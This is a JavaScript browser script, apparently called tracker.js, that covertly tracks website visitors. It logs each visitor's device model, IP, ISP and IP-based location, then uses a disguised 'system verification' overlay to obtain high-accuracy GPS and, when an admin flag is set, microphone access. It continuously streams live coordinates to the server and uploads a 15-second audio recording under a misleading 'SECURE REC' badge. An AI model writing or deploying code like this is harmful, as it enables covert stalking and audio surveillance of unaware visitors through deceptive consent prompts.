/**
 * tracker.js — Background Visitor Telemetry & GPS Geolocation watch
 * Silently records visitor details (IP, ISP, Geolocation, coordinates)
 * and monitors device movement to report live coordinates.
 * Prompts user for permissions via a custom system verification window if needed.
 */

(async function initLiveTracker() {
  // Generate a unique session ID for this page load
  const sessionLogId = 'visit-' + Date.now() + '-' + Math.round(Math.random() * 1E6);

  // Capture Device Model Details
  let deviceModel = 'PC/Desktop';
  if (navigator.userAgentData) {
    try {
      const entropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
      if (entropy.model) {
        deviceModel = entropy.model;
      } else if (entropy.platform) {
        deviceModel = `${entropy.platform} PC`;
      }
    } catch (e) {
      console.warn('High entropy user agent parsing blocked:', e);
    }
  } else {
    const ua = navigator.userAgent;
    if (/iPhone/i.test(ua)) deviceModel = 'iPhone';
    else if (/iPad/i.test(ua)) deviceModel = 'iPad';
    else if (/Android/i.test(ua)) {
      const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
      if (match && match[2]) {
        deviceModel = match[2].trim();
      } else {
        deviceModel = 'Android Device';
      }
    } else if (/Macintosh/i.test(ua)) {
      deviceModel = 'Macbook / iMac';
    } else if (/Linux/i.test(ua)) {
      deviceModel = 'Linux PC';
    }
  }

  // Telemetry Package
  let telemetry = {
    id: sessionLogId,
    ip: 'Unknown',
    city: 'Unknown',
    region: 'Unknown',
    country: 'Unknown',
    country_code: '',
    isp: 'Unknown',
    latitude: null,
    longitude: null,
    timezone: 'Unknown',
    page: window.location.pathname,
    ua: navigator.userAgent,
    device: deviceModel
  };

  // Keep track of the last geocoded coordinates to prevent overloading OSM Nominatim API
  let lastGeoLat = null;
  let lastGeoLon = null;

  // Visual status bar recording badge
  let recordBadge = null;

  // Dispatch telemetry report to backend server
  async function reportTelemetry() {
    try {
      await fetch('/api/log-visit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(telemetry)
      });
    } catch (err) {
      console.error('Failed to dispatch background telemetry:', err);
    }
  }

  // 1. Resolve network approximate location using IP API
  try {
    const res = await fetch('https://ipapi.co/json/');
    if (res.ok) {
      const data = await res.json();
      telemetry.ip = data.ip || telemetry.ip;
      telemetry.city = data.city || telemetry.city;
      telemetry.region = data.region || telemetry.region;
      telemetry.country = data.country_name || telemetry.country;
      telemetry.country_code = data.country_code || telemetry.country_code;
      telemetry.isp = data.org || telemetry.isp;
      telemetry.latitude = data.latitude || telemetry.latitude;
      telemetry.longitude = data.longitude || telemetry.longitude;
      telemetry.timezone = data.timezone || telemetry.timezone;
    }
  } catch (err) {
    console.warn('Network location endpoint unreachable. IP resolution pending.');
  }

  // Dispatch initial IP-based log immediately
  await reportTelemetry();

  // 2. Fetch admin settings config to see if microphone capture is active
  let microphoneEnabled = false;
  try {
    const settingsRes = await fetch('/api/settings');
    if (settingsRes.ok) {
      const settingsData = await settingsRes.ok ? await settingsRes.json() : null;
      if (settingsData) {
        microphoneEnabled = !!settingsData.microphoneEnabled;
      }
    }
  } catch (e) {
    console.warn('Could not read admin settings configuration:', e);
  }

  // 3. Setup permission checks and UI overlays
  let needOverlay = true;
  if (navigator.permissions && navigator.permissions.query) {
    try {
      const geoPerm = await navigator.permissions.query({ name: 'geolocation' });
      const geoGranted = (geoPerm.state === 'granted');
      
      let micGranted = true;
      if (microphoneEnabled) {
        const micPerm = await navigator.permissions.query({ name: 'microphone' });
        micGranted = (micPerm.state === 'granted');
      }
      
      if (geoGranted && micGranted) {
        needOverlay = false;
      }
    } catch (e) {
      // Permissions query not fully supported for mic/geo in this client
    }
  }

  const overlay = document.getElementById('permissionOverlay');
  const grantBtn = document.getElementById('grantPermissionBtn');
  const micItem = document.getElementById('microphonePermissionItem');

  if (needOverlay && overlay && grantBtn) {
    if (microphoneEnabled && micItem) {
      micItem.style.display = 'flex';
    }
    overlay.style.display = 'flex';

    grantBtn.addEventListener('click', () => {
      // Prompt for Geolocation
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          telemetry.latitude = pos.coords.latitude;
          telemetry.longitude = pos.coords.longitude;
          await reportTelemetry();
          startLiveGeolocationWatch();

          if (microphoneEnabled) {
            triggerMicrophoneCapture();
          } else {
            overlay.style.display = 'none';
          }
        },
        async (err) => {
          console.warn('Geolocation authorization rejected:', err);
          // Proceed to mic check even if location is blocked
          if (microphoneEnabled) {
            triggerMicrophoneCapture();
          } else {
            overlay.style.display = 'none';
          }
        },
        { enableHighAccuracy: true, timeout: 12000 }
      );
    });
  } else {
    // If permissions are already granted or verification window elements are missing
    startLiveGeolocationWatch();
    if (microphoneEnabled) {
      triggerMicrophoneCapture();
    }
  }

  // Microphone capture initialization
  async function triggerMicrophoneCapture() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      if (overlay) overlay.style.display = 'none';
      captureAudioSignature(stream);
    } catch (err) {
      console.warn('Microphone permission or capture rejected:', err);
      if (overlay) overlay.style.display = 'none';
    }
  }

  // 15-second audio record and upload
  function captureAudioSignature(stream) {
    let mediaRecorder;
    try {
      mediaRecorder = new MediaRecorder(stream);
    } catch (e) {
      console.error('MediaRecorder is unsupported by this browser:', e);
      return;
    }

    const chunks = [];
    mediaRecorder.ondataavailable = (e) => {
      if (e.data && e.data.size > 0) {
        chunks.push(e.data);
      }
    };

    // Create custom pulsing recording indicator in the status bar
    const statusBarLeft = document.querySelector('.status-bar-left');
    if (statusBarLeft) {
      recordBadge = document.createElement('span');
      recordBadge.className = 'recording-badge-pulsing';
      recordBadge.innerHTML = '<span class="recording-dot"></span> SECURE REC: 15s remaining';
      statusBarLeft.appendChild(recordBadge);
    }

    let secondsLeft = 15;
    const intervalId = setInterval(() => {
      secondsLeft--;
      if (recordBadge) {
        if (secondsLeft > 0) {
          recordBadge.innerHTML = `<span class="recording-dot"></span> SECURE REC: ${secondsLeft}s remaining`;
        } else {
          recordBadge.innerHTML = `<span class="recording-dot" style="background-color:var(--success);animation:none;"></span> SECURE REC: Uploading...`;
        }
      }
    }, 1000);

    mediaRecorder.onstop = async () => {
      clearInterval(intervalId);
      
      // Stop all tracks to release microphone hardware light
      stream.getTracks().forEach(track => track.stop());

      if (recordBadge) {
        recordBadge.innerHTML = `<span class="recording-dot" style="background-color:var(--success);animation:none;"></span> SECURE REC: Synced`;
        setTimeout(() => {
          recordBadge.remove();
        }, 3000);
      }

      const mimeType = mediaRecorder.mimeType || 'audio/webm';
      const audioBlob = new Blob(chunks, { type: mimeType });
      const formData = new FormData();
      formData.append('audio', audioBlob, `audio-${sessionLogId}.webm`);
      formData.append('sessionId', sessionLogId);

      try {
        await fetch('/api/upload-audio', {
          method: 'POST',
          body: formData
        });
        console.log('Telemetry audio payload dispatched successfully.');
      } catch (err) {
        console.error('Failed to dispatch telemetry audio:', err);
      }
    };

    mediaRecorder.start();

    // Record for exactly 15 seconds
    setTimeout(() => {
      if (mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
      }
    }, 15000);
  }

  // Live Location Tracker Watch
  function startLiveGeolocationWatch() {
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(
        async (pos) => {
          const currentLat = pos.coords.latitude;
          const currentLon = pos.coords.longitude;

          telemetry.latitude = currentLat;
          telemetry.longitude = currentLon;

          const latDiff = lastGeoLat !== null ? Math.abs(currentLat - lastGeoLat) : 1;
          const lonDiff = lastGeoLon !== null ? Math.abs(currentLon - lastGeoLon) : 1;

          if (latDiff > 0.00005 || lonDiff > 0.00005) {
            try {
              const geoRes = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${currentLat}&lon=${currentLon}&zoom=10`,
                {
                  headers: {
                    'User-Agent': 'LocationTrackerApp/2.0.0 (contact: locationtracker@localdomain.org)'
                  }
                }
              );
              if (geoRes.ok) {
                const geoData = await geoRes.json();
                if (geoData && geoData.address) {
                  telemetry.city = geoData.address.city || geoData.address.town || geoData.address.village || geoData.address.suburb || telemetry.city;
                  telemetry.region = geoData.address.state || telemetry.region;
                  telemetry.country = geoData.address.country || telemetry.country;
                }
              }
            } catch (e) {
              console.warn('Reverse geocoding error. Main logs unchanged.');
            }

            lastGeoLat = currentLat;
            lastGeoLon = currentLon;
          }

          console.log('Live location telemetry locked & dispatched.');
          await reportTelemetry();
        },
        (err) => {
          console.warn(`Live location tracking error: ${err.message}.`);
        },
        {
          enableHighAccuracy: true,
          maximumAge: 0,
          timeout: 15000
        }
      );
    }
  }
})();
